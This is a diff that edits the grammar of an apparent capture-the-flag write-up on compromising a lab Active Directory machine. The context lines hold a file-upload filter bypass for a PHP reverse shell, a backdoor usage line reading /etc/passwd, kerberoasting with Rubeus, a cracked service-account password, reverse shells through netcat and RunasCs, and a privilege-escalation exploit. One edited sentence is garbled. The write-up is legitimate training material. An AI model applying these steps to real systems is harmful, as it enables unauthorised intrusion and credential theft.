@@ -371,7 +371,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 # numResponses: 1
 ```
 
-Added new found sub domains into the `/etc/hosts` file.
+Add new found sub domains into the `/etc/hosts` file.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Access]
@@ -411,7 +411,7 @@ forestdnszones          [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Du
 :: Progress: [4989/4989] :: Job [1/1] :: 8 req/sec :: Duration: [0:05:32] :: Errors: 4986 ::
 ```
 
-Put the kerbrute for username enumeration on Active directory in background and found a username `Administrator`.
+Put the Kerbrute for username enumeration on Active Directory in the background and found a username `Administrator`.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Access]
@@ -434,7 +434,7 @@ Version: v1.0.3 (9dad6e1) - 11/29/25 - Ronnie Flathers @ropnop
 2025/11/29 08:45:32 >  Done! Tested 828 usernames (3 valid) in 0.729 seconds
 ```
 
-`ffuf` directory brute-forcing revealed an uploads directory. At the home page of port 80, there is a ticket buying page let us to upload a file which can accessible through uploads directory.
+The `ffuf` tool use for directory brute-forcing to revealed an uploads directory. At the home page of port 80, there is a ticket buying page that lets us upload a file, which is accessible through the uploads directory.
 
 ![image]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image.png 'Ticket Buying form')
 
@@ -474,7 +474,7 @@ server-status           [Status: 403, Size: 423, Words: 37, Lines: 12, Duration:
 :: Progress: [207629/207629] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
 ```
 
-Tried to upload reverse shell on upload page but could not able to upload a `.php` file. Manipulating file extension’s didn’t allow to upload a reverse shell. Below screenshot looks like giving filename two time works but on the uploads directory it save’s file name with the last name given.
+Tried to upload a reverse shell on the upload page but was not able to upload a `.php` file. Manipulating file extensions didn’t allow uploading a reverse shell. The below screenshot looks like giving the filename times works; two times works, but in the uploads directory, it saves the filename. It saves the filename with the last name given.
 
 ![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image1.png)
 
@@ -524,7 +524,7 @@ Generation Complete.
  test.asx          'test-(handler).htm'         test.jnlp                     test.pdf         'test-(stylesheet).xml'        zoom-attack-instructions.txt
 ```
 
-After few iteration with file extension tweak and prepend the magic byte. The one way successfully uploaded a reverse shell on the web page as mentioned below.
+After a few iterations with the file extension tweak and prepending the magic byte. The one way successfully uploaded a reverse shell on the web page as mentioned below.
 
 ![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image3.png)
 
@@ -554,7 +554,7 @@ access\svc_apache
 
 ### Intended way to get initial access
 
-try to manipulate the `.htaccess` file. Configure in a such way that `.evil` extension file can execute Php code.
+Try to manipulate the `.htaccess` file. Configure it in such a way that the `.evil` extension file can execute PHP code.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Access]
@@ -582,7 +582,7 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 <!--    http://michaeldaw.org   2006    -->
 ```
 
-Upload both (.htaccess, revshell.evil) the files using Ticket.php function on web application.
+Upload both (.htaccess and revshell.evil) the files using the Ticket.php function on the web application.
 
 ![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image.png)
 
@@ -594,7 +594,7 @@ Follow the same way as mentioned in Unintended way to get a reverse shell on the
 
 ## Privilege Escalation
 
-Transferred `SharpHound.ps1` file on to the victim’s system and harvest all the data.
+Transferred the `SharpHound.ps1` file onto the victim’s system and harvested all the data.
 
 ```
 PS C:\Users\svc_apache\Downloads> . .\SharpHound.ps1
@@ -608,11 +608,11 @@ PS C:\Users\svc_apache> net use M: /delete
 M: was deleted successfully.
 ```
 
-`SharpHound.ps1` generated “access offsec_202512020722525_BloodHound.zip” file into the our kali machine and see the data through Bloodhound and PlumHound. The PlumHound gives output that `svc_mssql` user’s can kerberoastable.
+`SharpHound.ps1` generated the `access offsec_202512020722525_BloodHound.zip` file into our Kali machine and see the data through Bloodhound and PlumHound. The PlumHound gives output that `svc_mssql` user's can Kerberoast.
 
 ![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image10.png)
 
-Upload a `Rubeus.exe` in the victim’s system for kerberoast the `svc_mssql` hash. Cracked that hash against the `rockyou.txt` wordlist and quickly got one password matched.
+Upload a `Rubeus.exe` in the victim’s system for Kerberoast the `svc_mssql` hash. Cracked that hash against the `rockyou.txt` wordlist and quickly got one password matched.
 
 ```
  C:\Users\svc_apache\Downloads> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
@@ -686,7 +686,7 @@ Started: Tue Dec 02 15:49:34 2025
 Stopped: Tue Dec 02 15:50:20 2025
 ```
 
-Upload a `nc64.exe` and `RunasCS.exe` through port 80 http and try to execute command as `svc_mssql:trustno1` user and get a reverse shell. 
+Upload a `nc64.exe` and `RunasCS.exe` through port 80 http, and try to execute the command as the `svc_mssql:trustno1` user and get a reverse shell.
 
 ```
 ---Terminal 1---
@@ -734,7 +734,7 @@ type local.txt
 f86a3c19a0e7a62f495c7d16bd663f54
 ```
 
-`whoami /priv` command gives interesting permission set `SeManageVolumePrivilege` which a bunch of article available for privilege escalation on the internet.
+The `whoami /priv` command gives an interesting permission set `SeManageVolumePrivilege` which a bunch of articles are available for privilege escalation on the internet.
 
 ```
 PS C:\Windows\system32> whoami /priv
@@ -765,7 +765,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 
 [Reference 4](https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege)
 
-After visiting few articles and github repository found a ready to execute exploit which I transferred into the victim’s system and execute it. 
+After visiting a few articles and the GitHub repository, I found a ready-to-execute exploit, which I transferred into the victim’s system and executed.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
